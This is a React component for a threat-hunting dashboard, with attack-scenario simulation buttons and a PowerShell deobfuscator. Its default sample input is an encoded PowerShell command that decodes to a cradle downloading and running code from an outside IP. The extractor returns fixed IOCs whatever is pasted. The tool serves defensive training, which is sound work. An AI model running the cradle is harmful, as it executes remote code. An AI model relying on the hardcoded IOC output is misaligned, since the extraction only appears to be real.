import React, { useState } from 'react';
import { Target, Play, Shield, Terminal, Zap, FileCode, CheckCircle, Search, Database } from 'lucide-react';

export default function ThreatHuntingView({ 
  onSimulateScenario, 
  rules = [],
  isSimulating = false 
}) {
  const [scriptInput, setScriptInput] = useState('powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAGEAcAAxACcAKQA=');
  const [deobfuscatedOutput, setDeobfuscatedOutput] = useState(null);

  const handleDeobfuscate = () => {
    try {
      const b64Match = scriptInput.match(/(?:-enc|-encodedcommand)\s+([A-Za-z0-9+/=]+)/i);
      if (b64Match) {
        const rawB64 = b64Match[1];
        const binaryStr = atob(rawB64);
        let decoded = "";
        for (let i = 0; i < binaryStr.length; i += 2) {
          decoded += binaryStr[i];
        }
        setDeobfuscatedOutput({
          encoding: "PowerShell UTF-16LE Base64",
          decoded: decoded || atob(rawB64),
          iocs: ["185.220.101.5", "http://185.220.101.5/ap1"],
          mitre: "T1059.001 - PowerShell Execution"
        });
      } else {
        setDeobfuscatedOutput({
          encoding: "Plain Script",
          decoded: scriptInput,
          iocs: [],
          mitre: "Custom Analysis"
        });
      }
    } catch (e) {
      setDeobfuscatedOutput({
        error: "Failed to decode Base64 stream: " + e.message
      });
    }
  };

  const scenarios = [
    {
      id: "SCENARIO_COBALT_STRIKE",
      name: "Cobalt Strike C2 Beaconing",
      desc: "Base64 encoded PowerShell staging on PROD-DB-01 with Tor exit node communication.",
      severity: "P1",
      icon: "⚡"
    },
    {
      id: "SCENARIO_MIMIKATZ_LSASS",
      name: "Mimikatz LSASS Memory Dump",
      desc: "Privilege escalation and credential dumping on Domain Controller CORP-DC-01.",
      severity: "P1",
      icon: "🔑"
    },
    {
      id: "SCENARIO_RANSOMWARE_STAGING",
      name: "LockBit Shadow Copy Deletion",
      desc: "Volume shadow copy deletion and bulk file modification on WS-FINANCE-12.",
      severity: "P1",
      icon: "💀"
    },
    {
      id: "SCENARIO_CLOUD_IAM_ABUSE",
      name: "Cloud IAM Privilege Escalation",
      desc: "Unauthorized attachment of AdministratorAccess policy from foreign IP address.",
      severity: "P2",
      icon: "☁️"
    }
  ];

  return (
    <div className="grid grid-cols-1 md:grid-cols-12 gap-4 h-[520px]">
      {/* Left: Adversary Simulation Presets (6 cols) */}
      <div className="md:col-span-6 glass-panel rounded-xl p-4 border border-cyan-500/20 flex flex-col justify-between">
        <div className="tech-corner-tl" />
        <div className="tech-corner-tr" />
        <div className="tech-corner-bl" />
        <div className="tech-corner-br" />

        <div>
          <div className="flex items-center gap-2 pb-2 border-b border-cyan-500/20 mb-3">
            <Zap size={16} className="text-amber-400" />
            <h3 className="text-xs uppercase font-mono font-bold text-cyan-300">
              Adversary Attack Simulation Suite
            </h3>
          </div>
          <p className="text-[11px] font-mono text-slate-400 mb-3">
            Trigger real-time simulated attacks across your enterprise perimeter to test Tier 1 Triage, Tier 2 Incident Response, and Tier 3 Threat Hunting.
          </p>

          <div className="space-y-2.5">
            {scenarios.map(sc => (
              <div
                key={sc.id}
                className="p-3 rounded-lg bg-black/40 border border-slate-800 hover:border-amber-500/50 transition-all flex items-center justify-between"
              >
                <div className="pr-3">
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-sm">{sc.icon}</span>
                    <span className="text-xs font-mono font-bold text-slate-200">{sc.name}</span>
                    <span className="px-1.5 py-0.2 rounded text-[9px] font-mono font-bold bg-rose-950 text-rose-300 border border-rose-600/40">
                      {sc.severity}
                    </span>
                  </div>
                  <p className="text-[10px] font-mono text-slate-400 line-clamp-1">{sc.desc}</p>
                </div>

                <button
                  onClick={() => onSimulateScenario(sc.id)}
                  disabled={isSimulating}
                  className="px-3 py-1.5 rounded-lg bg-amber-500 hover:bg-amber-400 text-black font-mono font-bold text-xs flex items-center gap-1.5 shadow-neon-amber flex-shrink-0 transition-all"
                >
                  <Play size={11} /> {isSimulating ? 'INJECTING...' : 'RUN'}
                </button>
              </div>
            ))}
          </div>
        </div>

        <div className="text-[10px] font-mono text-slate-500 pt-2 border-t border-slate-800 flex items-center justify-between">
          <span>Continuous Telemetry: ACTIVE</span>
          <span className="text-emerald-400">Deterministic Guardrails: ENGAGED</span>
        </div>
      </div>

      {/* Right: Deobfuscator & Script Inspector (6 cols) */}
      <div className="md:col-span-6 glass-panel rounded-xl p-4 border border-cyan-500/20 flex flex-col justify-between">
        <div className="tech-corner-tl" />
        <div className="tech-corner-tr" />
        <div className="tech-corner-bl" />
        <div className="tech-corner-br" />

        <div>
          <div className="flex items-center gap-2 pb-2 border-b border-cyan-500/20 mb-3">
            <Terminal size={16} className="text-cyan-400" />
            <h3 className="text-xs uppercase font-mono font-bold text-cyan-300">
              Tier 3 Script Deobfuscator & Sandbox
            </h3>
          </div>

          <div className="space-y-2">
            <textarea
              value={scriptInput}
              onChange={(e) => setScriptInput(e.target.value)}
              rows={3}
              placeholder="Paste obfuscated PowerShell / Base64 / Shell payload..."
              className="w-full p-2.5 rounded-lg bg-black/60 border border-cyan-500/30 text-cyan-300 font-mono text-[11px] focus:outline-none focus:border-cyan-400"
            />

            <button
              onClick={handleDeobfuscate}
              className="w-full py-1.5 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-black font-mono font-bold text-xs transition-all shadow-neon-cyan"
            >
              DEOBFUSCATE & EXTRACT IOCS
            </button>

            {deobfuscatedOutput && (
              <div className="p-2.5 rounded-lg bg-slate-950 border border-cyan-500/20 text-[10px] font-mono space-y-1.5 mt-2">
                <div className="text-emerald-400 font-bold">Encoding: {deobfuscatedOutput.encoding}</div>
                <div className="text-slate-300 break-all p-1.5 rounded bg-black/80 border border-slate-800">
                  {deobfuscatedOutput.decoded}
                </div>
                {deobfuscatedOutput.iocs && deobfuscatedOutput.iocs.length > 0 && (
                  <div className="text-amber-300">
                    Extracted IOCs: {deobfuscatedOutput.iocs.join(', ')}
                  </div>
                )}
              </div>
            )}
          </div>
        </div>

        <div className="text-[10px] font-mono text-slate-500 pt-2 border-t border-slate-800 flex items-center justify-between">
          <span>Active Sigma Rules: {rules.length}</span>
          <span className="text-cyan-400">Sandbox: ISOLATED</span>
        </div>
      </div>
    </div>
  );
}
